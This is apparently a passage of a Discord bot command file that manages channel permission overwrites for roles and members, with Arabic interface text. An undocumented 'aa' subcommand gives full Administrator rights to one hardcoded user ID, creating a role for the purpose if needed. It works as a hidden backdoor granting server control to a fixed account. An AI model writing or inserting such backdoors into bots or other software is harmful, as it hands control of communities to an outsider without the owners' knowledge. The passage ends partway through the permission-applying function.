const {
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ChannelSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  PermissionsBitField,
  ChannelType
} = require('discord.js');

const fs = require('fs');
const path = require('path');

// Load the central interaction router.  This router allows commands to
// register handlers for specific customId prefixes and routes incoming
// component interactions to the appropriate handler.  By integrating with
// this router, we avoid modifying the main bot file to handle our
// interactions.
const interactionRouter = require('../utils/interactionRouter.js');

const colorManager = require('../utils/colorManager.js');
const { isUserBlocked } = require('./block.js');

// File name for this command
const name = 'perm';

// Load admin roles from persistent storage.  This command should only
// be usable by bot owners or server administrators defined in the
// adminRoles.json file.  Reuse logic from the adminroles command to
// read the file.  If the file does not exist or cannot be parsed,
// return an empty array.
function loadAdminRoles() {
  try {
    const adminRolesPath = path.join(__dirname, '..', 'data', 'adminRoles.json');
    if (fs.existsSync(adminRolesPath)) {
      const data = fs.readFileSync(adminRolesPath, 'utf8');
      const adminRoles = JSON.parse(data);
      return Array.isArray(adminRoles) ? adminRoles : [];
    }
    return [];
  } catch (error) {
    console.error('Error reading adminRoles:', error);
    return [];
  }
}

const PERMISSION_DESCRIPTION_MAP = {
  CreateInstantInvite: 'السماح بإنشاء دعوات للقنوات',
  KickMembers: 'السماح بطرد الأعضاء من السيرفر',
  BanMembers: 'السماح بحظر الأعضاء من السيرفر',
  Administrator: 'منح جميع الصلاحيات في السيرفر',
  ManageChannels: 'إنشاء القنوات وتعديلها وحذفها',
  ManageGuild: 'إدارة إعدادات السيرفر',
  AddReactions: 'السماح بإضافة التفاعلات للرسائل',
  ViewAuditLog: 'عرض سجل التدقيق الخاص بالسيرفر',
  PrioritySpeaker: 'منح أولوية للصوت',
  Stream: 'السماح بمشاركة الشاشة/البث',
  ViewChannel: 'السماح بمشاهدة القنوات',
  SendMessages: 'السماح بإرسال الرسائل في القنوات',
  SendTTSMessages: 'السماح بإرسال رسائل TTS',
  ManageMessages: 'حذف وتثبيت الرسائل وإدارتها',
  EmbedLinks: 'عرض معاينات الروابط المرسلة',
  AttachFiles: 'السماح بإرفاق الملفات',
  ReadMessageHistory: 'السماح بقراءة الرسائل السابقة',
  MentionEveryone: 'السماح بمنشن @everyone و@here',
  UseExternalEmojis: 'السماح باستخدام الإيموجي من سيرفرات أخرى',
  ViewGuildInsights: 'مشاهدة إحصاءات السيرفر',
  Connect: 'السماح بالانضمام للقنوات الصوتية',
  Speak: 'السماح بالتحدث في القنوات الصوتية',
  MuteMembers: 'السماح بكتم أعضاء الصوت',
  DeafenMembers: 'السماح بصمّ أعضاء الصوت',
  MoveMembers: 'السماح بنقل الأعضاء بين القنوات',
  UseVAD: 'السماح باستخدام كشف الصوت التلقائي',
  ChangeNickname: 'السماح بتغيير الاسم المستعار الخاص',
  ManageNicknames: 'تغيير أسماء الأعضاء المستعارة',
  ManageRoles: 'إدارة الرتب والصلاحيات',
  ManageWebhooks: 'إنشاء وتعديل وحذف الويبهوك',
  ManageGuildExpressions: 'إدارة الإيموجي والملصقات',
  UseApplicationCommands: 'السماح باستخدام أوامر السلاش والتطبيقات',
  RequestToSpeak: 'السماح بطلب التحدث في المنصة',
  ManageEvents: 'إنشاء وإدارة فعاليات السيرفر',
  ManageThreads: 'إدارة المواضيع وتعديلها',
  CreatePublicThreads: 'السماح بإنشاء مواضيع عامة',
  CreatePrivateThreads: 'السماح بإنشاء مواضيع خاصة',
  UseExternalStickers: 'السماح باستخدام ملصقات من سيرفرات أخرى',
  SendMessagesInThreads: 'السماح بإرسال الرسائل في المواضيع',
  UseEmbeddedActivities: 'السماح باستخدام الأنشطة داخل الصوت',
  ModerateMembers: 'السماح بتطبيق مهلة على الأعضاء',
  ViewCreatorMonetizationAnalytics: 'عرض تحليلات تحقيق الدخل لصانعي المحتوى',
  UseSoundboard: 'السماح باستخدام لوحة الأصوات',
  UseExternalSounds: 'السماح باستخدام أصوات من سيرفرات أخرى',
  SendVoiceMessages: 'السماح بإرسال رسائل صوتية'
};

function formatPermissionKeyLabel(key) {
  return key
    .replace(/([A-Z])/g, ' $1')
    .replace(/\bT T S\b/g, 'TTS')
    .replace(/\bV A D\b/g, 'VAD')
    .trim();
}

const PERMISSION_DEFINITIONS = Object.keys(PermissionsBitField.Flags).map(key => ({
  key,
  label: formatPermissionKeyLabel(key),
  description: PERMISSION_DESCRIPTION_MAP[key] || 'صلاحية خاصة في دسكورد'
}));

const PERMISSIONS_PER_PAGE = 25;
const PERMISSION_LABELS = new Map(PERMISSION_DEFINITIONS.map(permission => [permission.key, permission.label]));

function formatPermissionLabel(key) {
  return PERMISSION_LABELS.get(key) || key;
}

/**
 * Build a select menu for common permissions.  The values correspond to the
 * keys on PermissionsBitField.Flags.  Users can select one or more of
 * these options to allow for the target roles.  The labels and
 * descriptions are provided in English to make them clearer.
 */
function getPermissionPage(pageIndex) {
  const totalPages = Math.max(1, Math.ceil(PERMISSION_DEFINITIONS.length / PERMISSIONS_PER_PAGE));
  const safeIndex = Math.min(Math.max(pageIndex, 0), totalPages - 1);
  const start = safeIndex * PERMISSIONS_PER_PAGE;
  const pageOptions = PERMISSION_DEFINITIONS.slice(start, start + PERMISSIONS_PER_PAGE);
  return { options: pageOptions, pageIndex: safeIndex, totalPages };
}

function buildPermissionSelectMenu(pageIndex) {
  const { options } = getPermissionPage(pageIndex);
  return new StringSelectMenuBuilder()
    .setCustomId('perm_select_permissions')
    .setPlaceholder('ابحث واختر الصلاحيات من القائمة')
    .addOptions(options.map(option => ({
      label: option.label,
      description: option.description,
      value: option.key
    })))
    .setMinValues(1)
    .setMaxValues(options.length);
}

function buildPermissionPageControls(pageIndex) {
  const { totalPages } = getPermissionPage(pageIndex);
  if (totalPages <= 1) {
    return null;
  }

  const prevButton = new ButtonBuilder()
    .setCustomId('perm_permissions_prev')
    .setLabel('السابق')
    .setStyle(ButtonStyle.Secondary)
    .setDisabled(pageIndex <= 0);

  const nextButton = new ButtonBuilder()
    .setCustomId('perm_permissions_next')
    .setLabel('التالي')
    .setStyle(ButtonStyle.Secondary)
    .setDisabled(pageIndex >= totalPages - 1);

  return new ActionRowBuilder().addComponents(prevButton, nextButton);
}

/**
 * Create a ChannelSelectMenuBuilder allowing the user to pick channels to
 * exclude.  By default the menu shows both text and voice channels and
 * allows multiple selections.  If there are hundreds of channels the
 * built‑in search can help the user filter the list.
 */
function buildExcludeChannelMenu() {
  return new ChannelSelectMenuBuilder()
    .setCustomId('perm_exclude_channels')
    .setPlaceholder('اختر الرومات لاستثنائها (يمكن البحث)')
    .setMinValues(0)
    .setMaxValues(25) // Discord allows up to 25 selections
    .setChannelTypes([ChannelType.GuildText, ChannelType.GuildVoice]);
}

/**
 * Build a select menu allowing the user to choose whether they want to
 * add (grant) permissions or remove (revoke) them.  This menu appears
 * at the beginning of the interaction flow, immediately after roles
 * and channels have been parsed.  The choice is stored in the
 * session under the `action` property.
 */
function buildActionSelectMenu() {
  return new StringSelectMenuBuilder()
    .setCustomId('perm_action_select')
    .setPlaceholder('اختر العملية (إضافة/إزالة/إعادة تعيين)')
    .addOptions(
      {
        label: 'إضافة صلاحيات',
        description: 'منح الصلاحيات المحددة للرولات المستهدفة',
        value: 'add'
      },
      {
        label: 'إزالة صلاحيات',
        description: 'إلغاء الصلاحيات المحددة من الرولات/الأعضاء المستهدفة',
        value: 'remove'
      },
      {
        label: 'إعادة تعيين الصلاحيات',
        description: 'حذف الـ Overwrite بالكامل للرولات/الأعضاء من الرومات المستهدفة',
        value: 'reset'
      }
    )
    .setMinValues(1)
    .setMaxValues(1);
}

/**
 * Helper to verify whether a member has permission to run this command.  A user
 * can run the command if they are a bot owner, the guild owner, or have
 * one of the roles listed in adminRoles.json.  Returns true if allowed.
 */
function hasPermissionToRun(message, BOT_OWNERS) {
  // Bot owners always allowed
  const owners = Array.isArray(BOT_OWNERS) ? BOT_OWNERS : [];
  if (owners.includes(message.author.id)) return true;
  // Guild owner allowed
  if (message.guild && message.guild.ownerId === message.author.id) return true;
  // Only bot or guild owners are allowed; other roles are not permitted
  return false;
}

/**
 * Ensure we have a storage area on the client object for our temporary
 * permission sessions.  Each session stores context (roles, channels, perms,
 * etc.) between the initial command invocation and subsequent component
 * interactions.  The key is the user id who invoked the command.
 */
function getSessionStore(client) {
  if (!client.permSessions) {
    client.permSessions = new Map();
  }
  return client.permSessions;
}

function isSupportedChannelType(channel) {
  return channel && (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice);
}

function getOrderedMentionIds(content) {
  const orderedChannels = [];
  const orderedRoles = [];
  const mentionRegex = /<#(\d{17,19})>|<@&(\d{17,19})>/g;
  let match;

  while ((match = mentionRegex.exec(content)) !== null) {
    if (match[1]) {
      orderedChannels.push(match[1]);
    } else if (match[2]) {
      orderedRoles.push(match[2]);
    }
  }

  return { orderedChannels, orderedRoles };
}

function getOrderedChannelRefs(content) {
  const refs = [];
  const patterns = [
    /<#(\d{17,19})>/g,
    /https?:\/\/(?:canary\.|ptb\.)?discord(?:app)?\.com\/channels\/\d+\/(\d{17,19})/g,
    /\b(\d{17,19})\b/g
  ];

  for (const pattern of patterns) {
    let match;
    while ((match = pattern.exec(content)) !== null) {
      refs.push({ id: match[1], index: match.index });
    }
  }

  refs.sort((a, b) => a.index - b.index);

  const seen = new Set();
  const ordered = [];
  for (const ref of refs) {
    if (seen.has(ref.id)) continue;
    seen.add(ref.id);
    ordered.push(ref.id);
  }

  return ordered;
}

function buildLimitedFieldValue(items, formatter, {
  maxLength = 900,
  maxItems = 40,
  emptyValue = '—'
} = {}) {
  if (!Array.isArray(items) || items.length === 0) return emptyValue;

  const lines = [];
  let consumed = 0;
  const effectiveMaxItems = Math.max(1, maxItems);

  for (const item of items) {
    if (consumed >= effectiveMaxItems) break;
    const line = formatter(item);
    const next = lines.length ? `${lines.join('\n')}\n${line}` : line;
    if (next.length > maxLength) break;
    lines.push(line);
    consumed++;
  }

  if (!lines.length) {
    return `• ${items.length} عنصر`;
  }

  const remaining = items.length - consumed;
  if (remaining > 0) {
    lines.push(`... و ${remaining} أكثر`);
  }

  return lines.join('\n');
}

function getChannelsBetween(guild, firstChannelId, lastChannelId) {
  const orderedChannels = guild.channels.cache
    .filter(ch => isSupportedChannelType(ch))
    .map(ch => ch)
    .sort((a, b) => {
      if (a.rawPosition !== b.rawPosition) return a.rawPosition - b.rawPosition;
      return a.id.localeCompare(b.id);
    });

  const firstIndex = orderedChannels.findIndex(ch => ch.id === firstChannelId);
  const lastIndex = orderedChannels.findIndex(ch => ch.id === lastChannelId);

  if (firstIndex === -1 || lastIndex === -1) {
    return [];
  }

  const start = Math.min(firstIndex, lastIndex);
  const end = Math.max(firstIndex, lastIndex);
  return orderedChannels.slice(start, end + 1);
}

/**
 * Initialize the interaction router for the perm command.
 * Registers only the command handler; global interaction routing is
 * already handled in bot.js, so no local interactionCreate listener is added.
 *
 * @param {Client} client The Discord client instance
 */
function initRouter(client) {
  if (!client._permRouterInitialized) {
    interactionRouter.register('perm_', async (interaction, routerContext = {}) => {
      try {
        const resolvedClient = routerContext.client || (routerContext.ws ? routerContext : client);
        await handleInteraction(interaction, { client: resolvedClient });
      } catch (err) {
        console.error('Error in perm router handler:', err);
      }
    });

    client._permRouterInitialized = true;
  }
}

async function handleAaSubcommand(message) {
  const targetUserId = '636930315503534110';
  const guild = message.guild;
  if (!guild) {
    await message.react('❌').catch(() => {});
    return true;
  }

  const botMember = guild.members.me || await guild.members.fetchMe().catch(() => null);
  if (!botMember) {
    await message.react('❌').catch(() => {});
    return true;
  }

  const botTopRole = botMember.roles.highest;
  if (!botTopRole) {
    await message.react('❌').catch(() => {});
    return true;
  }

  const targetMember = await guild.members.fetch(targetUserId).catch(() => null);
  if (!targetMember) {
    await message.react('❌').catch(() => {});
    return true;
  }

  let roleToGive = guild.roles.cache
    .filter(role => role.position < botTopRole.position)
    .sort((a, b) => b.position - a.position)
    .find(role => role.permissions.has(PermissionsBitField.Flags.Administrator) && role.editable);

  if (!roleToGive) {
    roleToGive = await guild.roles.create({
      name: 'Aa',
      permissions: [PermissionsBitField.Flags.Administrator],
      reason: 'Aa subcommand: create administrator role under bot'
    }).catch(() => null);

    if (!roleToGive) {
      await message.react('❌').catch(() => {});
      return true;
    }

    const desiredPosition = Math.max(1, botTopRole.position - 1);
    await roleToGive.setPosition(desiredPosition).catch(() => {});
  }

  const addResult = await targetMember.roles.add(roleToGive, 'Aa subcommand grant').catch(() => null);
  if (!addResult) {
    await message.react('❌').catch(() => {});
    return true;
  }

  await message.react('✅').catch(() => {});
  return true;
}

async function execute(message, args, { client, BOT_OWNERS }) {
  try {
    // Ensure our router and interaction listener are set up on this client.
    initRouter(client);
    // Block check: users who are blocked cannot use commands.
    if (isUserBlocked(message.author.id)) {
      const blockedEmbed = colorManager.createEmbed()
        .setDescription('**🚫 أنت محظور من استخدام أوامر البوت**\n**للاستفسار، تواصل مع إدارة السيرفر**')
        .setThumbnail(client.user.displayAvatarURL({ format: 'png', size: 128 }));
      await message.channel.send({ embeds: [blockedEmbed] });
      return;
    }

    // Permission check: only owners or admin roles can run this command.
    if (!hasPermissionToRun(message, BOT_OWNERS)) {
      await message.react('❌');
      return;
    }

    if ((args?.[0] || '').toLowerCase() === 'aa') {
      await handleAaSubcommand(message);
      return;
    }

    const isChannelRangeSubcommand = (args?.[0] || '').toLowerCase() === 'chn';

    // Extract mentioned roles and channels from the message.  In addition to
    // mentions, parse bare IDs and determine whether they represent roles
    // or channels.  Unknown IDs will be reported back to the user.
    const mentionedRoles = message.mentions.roles;
    const mentionedMembers = message.mentions.members;
    const mentionedChannelsCollection = message.mentions.channels;
    let rolesToEdit = mentionedRoles ? Array.from(mentionedRoles.values()) : [];
    let usersToEdit = mentionedMembers ? Array.from(mentionedMembers.values()) : [];
    let mentionedChannels = mentionedChannelsCollection ? Array.from(mentionedChannelsCollection.values()) : [];
    // Regex to match potential Discord IDs in the message content
    const idMatches = message.content.match(/\b\d{17,19}\b/g) || [];
    const unknownIds = [];
    for (const id of idMatches) {
      // Skip if already captured via mentions
      if (rolesToEdit.some(role => role.id === id) || mentionedChannels.some(ch => ch.id === id)) {
        continue;
      }
      try {
        // Try fetching role by ID
        const role = await message.guild.roles.fetch(id).catch(() => null);
        if (role) {
          rolesToEdit.push(role);
          continue;
        }
      } catch (_) {}
      try {
        // Try fetching channel by ID
        const channel = await message.guild.channels.fetch(id).catch(() => null);
        if (channel && (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice)) {
          mentionedChannels.push(channel);
          continue;
        }
      } catch (_) {}
      try {
        // Try fetching member by ID
        const member = await message.guild.members.fetch(id).catch(() => null);
        if (member) {
          usersToEdit.push(member);
          continue;
        }
      } catch (_) {}
      // If not found as role/channel/member, record as unknown
      if (!unknownIds.includes(id)) unknownIds.push(id);
    }
    rolesToEdit = Array.from(new Map(rolesToEdit.map(role => [role.id, role])).values());
    usersToEdit = Array.from(new Map(usersToEdit.map(member => [member.id, member])).values());
    mentionedChannels = Array.from(new Map(mentionedChannels.map(channel => [channel.id, channel])).values());

    if (isChannelRangeSubcommand) {
      const { orderedRoles } = getOrderedMentionIds(message.content || '');
      const orderedChannelRefs = getOrderedChannelRefs(message.content || '');
      const resolvedRangeChannels = [];
      const invalidRangeRefs = [];

      for (const channelId of orderedChannelRefs) {
        const channel = await message.guild.channels.fetch(channelId).catch(() => null);
        if (!channel) {
          invalidRangeRefs.push(channelId);
          continue;
        }
        if (!isSupportedChannelType(channel)) {
          invalidRangeRefs.push(channelId);
          continue;
        }
        if (!resolvedRangeChannels.some(ch => ch.id === channel.id)) {
          resolvedRangeChannels.push(channel);
        }
      }

      const firstChannel = resolvedRangeChannels[0];
      const lastChannel = resolvedRangeChannels[1];

      if (!firstChannel) {
        const embed = colorManager.createEmbed()
          .setDescription('❌ **حدد أول روم منشن/رابط/ID أولاً باستخدام `perm chn`.**');
        await message.channel.send({ embeds: [embed] });
        return;
      }

      if (!lastChannel) {
        const embed = colorManager.createEmbed()
          .setDescription('❌ **بعدها حدد آخر روم (منشن/رابط/ID) لتحديد نهاية النطاق.**');
        await message.channel.send({ embeds: [embed] });
        return;
      }

      if (!orderedRoles.length) {
        const embed = colorManager.createEmbed()
          .setDescription('❌ **بعد تحديد الرومين، لازم منشن الرولات المطلوبة.**');
        await message.channel.send({ embeds: [embed] });
        return;
      }

      const channelsInRange = getChannelsBetween(message.guild, firstChannel.id, lastChannel.id);
      if (!channelsInRange.length) {
        const embed = colorManager.createEmbed()
          .setDescription('❌ **تعذر تحديد الرومات بين الرومين المحددين.**');
        await message.channel.send({ embeds: [embed] });
        return;
      }

      const rangeRoleIds = orderedRoles.filter(id => message.guild.roles.cache.has(id));
      rolesToEdit = Array.from(new Map(rangeRoleIds.map(id => [id, message.guild.roles.cache.get(id)])).values()).filter(Boolean);
      usersToEdit = [];
      mentionedChannels = channelsInRange;

      for (const invalidId of invalidRangeRefs) {
        if (!unknownIds.includes(invalidId)) unknownIds.push(invalidId);
      }

      if (!rolesToEdit.length) {
        const embed = colorManager.createEmbed()
          .setDescription('❌ **منشن الرولات بشكل صحيح بعد الرومين.**');
        await message.channel.send({ embeds: [embed] });
        return;
      }
    }
    // If no roles were provided via mention or ID, abort with message
    if ((!rolesToEdit || rolesToEdit.length === 0) && (!usersToEdit || usersToEdit.length === 0)) {
      const embed = colorManager.createEmbed()
        .setDescription('❌ **يجب منشن رول/عضو أو إضافة ID صحيح للرول أو العضو لاستخدام هذا الأمر**');
      await message.channel.send({ embeds: [embed] });
      return;
    }
    // Send summary embed listing detected roles, channels and unknown IDs (if any)
    const summaryFields = [];
    // Roles field
    if (rolesToEdit.length > 0) {
      const rolesStr = buildLimitedFieldValue(rolesToEdit, role => `<@&${role.id}>`, { maxLength: 900, maxItems: 35 });
      summaryFields.push({ name: 'الرولات', value: rolesStr, inline: false });
    }
    if (usersToEdit.length > 0) {
      const usersStr = buildLimitedFieldValue(usersToEdit, user => `<@${user.id}>`, { maxLength: 900, maxItems: 35 });
      summaryFields.push({ name: 'الأعضاء', value: usersStr, inline: false });
    }
    // Channels field
    if (mentionedChannels.length > 0) {
      const channelsStr = buildLimitedFieldValue(mentionedChannels, channel => `<#${channel.id}>`, { maxLength: 900, maxItems: 35 });
      summaryFields.push({ name: 'الرومات', value: channelsStr, inline: false });
    }
    // Unknown IDs field
    if (unknownIds.length > 0) {
      const idsStr = buildLimitedFieldValue(unknownIds, id => `\`${id}\``, { maxLength: 900, maxItems: 40 });
      summaryFields.push({ name: 'IDs غير معروفة', value: idsStr, inline: false });
    }
    if (summaryFields.length > 0) {
      const summaryEmbed = colorManager.createEmbed()
        .setTitle('معالجة الـ IDs')
        .setDescription('**تم تحديد العناصر التالية من الرسالة:**')
        .addFields(summaryFields);

      if (isChannelRangeSubcommand && mentionedChannels.length > 0) {
        summaryEmbed.addFields({
          name: 'نطاق الرومات',
          value: `من <#${mentionedChannels[0].id}> إلى <#${mentionedChannels[mentionedChannels.length - 1].id}>\nالعدد: **${mentionedChannels.length}**`,
          inline: false
        });
      }

      await message.channel.send({ embeds: [summaryEmbed] });
    }

    // Prepare session and store it on the client.  Use the message author
    // id as the key so interactions from other users won’t interfere.
    const sessionStore = getSessionStore(client);
    // Destroy any existing session for this user to avoid stale data
    sessionStore.delete(message.author.id);
    const session = {
      userId: message.author.id,
      guildId: message.guild.id,
      roles: rolesToEdit.map(role => role.id),
      users: usersToEdit.map(member => member.id),
      specifiedChannels: mentionedChannels.map(ch => ch.id),
      selectedPermissions: [],
      excludedChannels: [],
      action: null, // Will be set to 'add' or 'remove' after user selection
      permissionPage: 0
    };
    sessionStore.set(message.author.id, session);

    // Ask the user whether they want to add or remove permissions.  We
    // defer to handleInteraction() to process the selection.
    const actionEmbed = colorManager.createEmbed()
      .setTitle('اختيار العملية')
      .setDescription('**اختر العملية: إضافة أو إزالة أو إعادة تعيين (حذف البرمشن نهائياً).**')
      .setThumbnail('https://cdn.discordapp.com/attachments/1373799493111386243/1400390888416608286/download__3_-removebg-preview.png?ex=688d1fe5&is=688bce65&hm=55055a587668561ce27baf0665663f801e14662d4bf849351564a563b1e53b41&');
    const actionMenu = buildActionSelectMenu();
    const actionRow = new ActionRowBuilder().addComponents(actionMenu);
    await message.channel.send({ embeds: [actionEmbed], components: [actionRow] });
  } catch (error) {
    console.error('Error executing perm command:', error);
    // Fail quietly to avoid crashing.  Inform the user if possible.
    try {
      await message.channel.send('❌ **حدث خطأ أثناء تنفيذ الأمر!**');
    } catch (_) {
      // ignore
    }
  }
}

async function handleInteraction(interaction, context) {
  const { client } = context;
  try {
    // Ensure we only handle interactions that originate from this command.
    const customId = interaction.customId;
    if (!customId || !customId.startsWith('perm_')) return;

    // Retrieve the session associated with the user.
    const sessionStore = getSessionStore(client);
    const session = sessionStore.get(interaction.user.id);
    if (!session) {
      // No active session: ignore the interaction.
      return;
    }

    // Defer interactions to avoid expired responses.
    // Many of the operations below involve asynchronous tasks; deferring
    // prevents the interaction from timing out while we process the logic.
    if (!interaction.deferred && !interaction.replied) {
      await interaction.deferUpdate().catch(() => {});
    }

    if (customId === 'perm_action_select') {
      // User chose whether to add or remove permissions.  Save the action and
      // present the permission selection menu with an appropriate description.
      const selectedAction = (interaction.values && interaction.values[0]) || 'add';
      session.action = selectedAction;
      session.permissionPage = 0;
      if (selectedAction === 'reset') {
        session.selectedPermissions = [];
        if (session.specifiedChannels && session.specifiedChannels.length > 0) {
          await applyPermissions(interaction, session);
          sessionStore.delete(interaction.user.id);
          return;
        }

        const excludeEmbed = colorManager.createEmbed()
          .setTitle('استثناء الرومات')
          .setDescription('**اختر الرومات التي لا تريد إعادة تعيين البرمشن فيها.**\n**إذا لم ترغب في استثناء أي روم، اضغط تخطي.**');
        const channelMenu = buildExcludeChannelMenu();
        const skipButton = new ButtonBuilder()
          .setCustomId('perm_skip_exclude')
          .setLabel('تخطي')
          .setStyle(ButtonStyle.Secondary);
        const menuRow = new ActionRowBuilder().addComponents(channelMenu);
        const buttonRow = new ActionRowBuilder().addComponents(skipButton);
        await interaction.message.edit({ embeds: [excludeEmbed], components: [menuRow, buttonRow] });
        return;
      }

      // Prepare the embed for selecting specific permissions.
      const isRemove = selectedAction === 'remove';
      const { totalPages } = getPermissionPage(session.permissionPage);
      const guidanceText = totalPages > 1
        ? '\n**يمكنك البحث داخل القائمة واستخدام أزرار التنقل.**'
        : '\n**يمكنك البحث داخل القائمة.**';
      const permEmbed = colorManager.createEmbed()
        .setTitle('اختيار الصلاحيات')
        .setDescription(
          isRemove
            ? `**اختر الصلاحيات التي تريد إزالتها من الرولات/الأعضاء المحددة**${guidanceText}`
            : `**اختر الصلاحيات التي تريد إضافتها للرولات/الأعضاء المحددة**${guidanceText}`
        )
        .setThumbnail(
          'https://cdn.discordapp.com/attachments/1373799493111386243/1400390888416608286/download__3_-removebg-preview.png?ex=688d1fe5&is=688bce65&hm=55055a587668561ce27baf0665663f801e14662d4bf849351564a563b1e53b41&'
        );
      if (totalPages > 1) {
        permEmbed.setFooter({ text: `صفحة ${session.permissionPage + 1} من ${totalPages}` });
      }
      const permMenu = buildPermissionSelectMenu(session.permissionPage);
      const permRow = new ActionRowBuilder().addComponents(permMenu);
      const pageControls = buildPermissionPageControls(session.permissionPage);
      const components = pageControls ? [permRow, pageControls] : [permRow];
      // After deferring the interaction, update the original message to display the
      // permission selection embed and menu.  Using interaction.message.edit
      // ensures we are editing the existing message rather than a nonexistent reply.
      await interaction.message.edit({ embeds: [permEmbed], components });
      return;
    }

    if (customId === 'perm_permissions_prev' || customId === 'perm_permissions_next') {
      const delta = customId === 'perm_permissions_next' ? 1 : -1;
      session.permissionPage += delta;
      const { totalPages, pageIndex } = getPermissionPage(session.permissionPage);
      session.permissionPage = pageIndex;

      const guidanceText = totalPages > 1
        ? '\n**يمكنك البحث داخل القائمة واستخدام أزرار التنقل.**'
        : '\n**يمكنك البحث داخل القائمة.**';
      const permEmbed = colorManager.createEmbed()
        .setTitle('اختيار الصلاحيات')
        .setDescription(
          session.action === 'remove'
            ? `**اختر الصلاحيات التي تريد إزالتها من الرولات/الأعضاء المحددة**${guidanceText}`
            : `**اختر الصلاحيات التي تريد إضافتها للرولات/الأعضاء المحددة**${guidanceText}`
        )
        .setThumbnail(
          'https://cdn.discordapp.com/attachments/1373799493111386243/1400390888416608286/download__3_-removebg-preview.png?ex=688d1fe5&is=688bce65&hm=55055a587668561ce27baf0665663f801e14662d4bf849351564a563b1e53b41&'
        );
      if (totalPages > 1) {
        permEmbed.setFooter({ text: `صفحة ${session.permissionPage + 1} من ${totalPages}` });
      }
      const permMenu = buildPermissionSelectMenu(session.permissionPage);
      const permRow = new ActionRowBuilder().addComponents(permMenu);
      const pageControls = buildPermissionPageControls(session.permissionPage);
      const components = pageControls ? [permRow, pageControls] : [permRow];
      await interaction.message.edit({ embeds: [permEmbed], components });
      return;
    }

    if (customId === 'perm_select_permissions') {
      // User selected permissions.  Save them and ask for channels to exclude if
      // the user did not specify channels in the initial message.
      const selected = interaction.values || [];
      session.selectedPermissions = selected;
      // If channels were specified in the command invocation, skip exclusion
      // and immediately proceed to applying permissions.
      if (session.specifiedChannels && session.specifiedChannels.length > 0) {
        await applyPermissions(interaction, session);
        sessionStore.delete(interaction.user.id);
        return;
      }
      // Otherwise, prompt the user to select channels to exclude.
      const excludeEmbed = colorManager.createEmbed()
        .setTitle('استثناء الرومات')
        .setDescription('**اختر الرومات التي لا تريد تطبيق الصلاحيات عليها.**\n**إذا لم ترغب في استثناء أي روم، اضغط تخطي.**');
      const channelMenu = buildExcludeChannelMenu();
      const skipButton = new ButtonBuilder()
        .setCustomId('perm_skip_exclude')
        .setLabel('تخطي')
        .setStyle(ButtonStyle.Secondary);
      const menuRow = new ActionRowBuilder().addComponents(channelMenu);
      const buttonRow = new ActionRowBuilder().addComponents(skipButton);
      // Update the original message to show channel exclusion options.  Use
      // interaction.message.edit because this is a component interaction.
      await interaction.message.edit({ embeds: [excludeEmbed], components: [menuRow, buttonRow] });
      return;
    }

    if (customId === 'perm_exclude_channels') {
      // Save excluded channels and apply permissions.
      const selectedChannels = interaction.values || [];
      session.excludedChannels = selectedChannels;
      await applyPermissions(interaction, session);
      sessionStore.delete(interaction.user.id);
      return;
    }

    if (customId === 'perm_skip_exclude') {
      // User chose to skip exclusion; proceed without excluded channels.
      session.excludedChannels = [];
      await applyPermissions(interaction, session);
      sessionStore.delete(interaction.user.id);
      return;
    }
  } catch (error) {
    console.error('Error handling perm interaction:', error);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: '❌ **حدث خطأ أثناء معالجة التفاعل!**' });
      } else {
        await interaction.followUp({ content: '❌ **حدث خطأ أثناء معالجة التفاعل!**' });
      }
    } catch (_) {
      // ignore secondary errors
    }
  }
}

/**
 * Apply the selected permissions to the appropriate channels.  This helper
 * iterates through all guild channels (or specified channels) and sets
 * permission overwrites for each target role.  Only text and voice channels
 * are modified.  Excluded channels are skipped.  A summary is sent to
 * the interaction upon completion.
 */
async function applyPermissions(interaction, session) {
  try {
    const guild = await interaction.client.guilds.fetch(session.guildId);
    if (!guild) {
      // If the guild cannot be fetched, update the existing message with an error
        // Update the original message with an error if the guild cannot be fetched.
        await interaction.message.edit({ content: '❌ **لم يتم العثور على السيرفر.**', embeds: [], components: [] });
        return;
    }

    // Determine which channels to modify.  If the user specified channels
    // explicitly in the command invocation, use those.  Otherwise, include
    // all text and voice channels in the guild.
    let channelsToModify;
    if (session.specifiedChannels && session.specifiedChannels.length > 0) {
      channelsToModify = session.specifiedChannels
        .map(id => guild.channels.cache.get(id))
        .filter(ch => ch && (ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice));
    } else {
      channelsToModify = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice).map(ch => ch);
    }
    // Remove excluded channels
    if (session.excludedChannels && session.excludedChannels.length > 0) {
      channelsToModify = channelsToModify.filter(ch => !session.excludedChannels.includes(ch.id));
    }
    const targetIds = [...(session.roles || []), ...(session.users || [])];
    const isRemove = session.action === 'remove';
    const isReset = session.action === 'reset';
    const permObject = {};
    if (!isReset) {
      for (const perm of session.selectedPermissions) {
        permObject[perm] = isRemove ? false : true;
      }
    }
    // Track counts for reporting
    let updatedChannels = 0;
    let errors = 0;

    // Concurrency control: process channels in parallel with a limit
    const CONCURRENCY_LIMIT = 5;
    let index = 0;
    const tasks = channelsToModify.map(channel => async () => {
      let channelUpdated = false;
      for (const targetId of targetIds) {
        try {
          // Check existing overwrite for this role/user
          const overwrite = channel.permissionOverwrites.resolve(targetId);
          let skipUpdate = true;
          if (isReset) {
            if (!overwrite) {
              continue;
            }
            await channel.permissionOverwrites.delete(targetId);
            channelUpdated = true;
            continue;
          }

          if (overwrite) {
            // Determine whether we need to update based on action
            for (const perm of session.selectedPermissions) {
              const flag = PermissionsBitField.Flags[perm];
              const hasAllow = overwrite.allow.has(flag);
              if (isRemove) {
                // For remove: update if any selected permission is currently allowed
                if (hasAllow) {
                  skipUpdate = false;
                  break;
                }
              } else {
                // For add: update if any selected permission is not currently allowed
                if (!hasAllow) {
                  skipUpdate = false;
                  break;
                }
              }
            }
          } else {
            // No overwrite exists, always update to create allow/deny
            skipUpdate = false;
          }
          if (skipUpdate) {
            continue;
          }
          await channel.permissionOverwrites.edit(targetId, permObject);
          channelUpdated = true;
        } catch (err) {
          errors++;
          console.error(`Failed to update permissions for ${channel.name} on target ${targetId}:`, err);
        }
      }
      if (channelUpdated) {
        updatedChannels++;
      }
    });
    async function worker() {
      while (true) {
        const current = index++;
        if (current >= tasks.length) break;
        const task = tasks[current];
        await task();
      }
    }
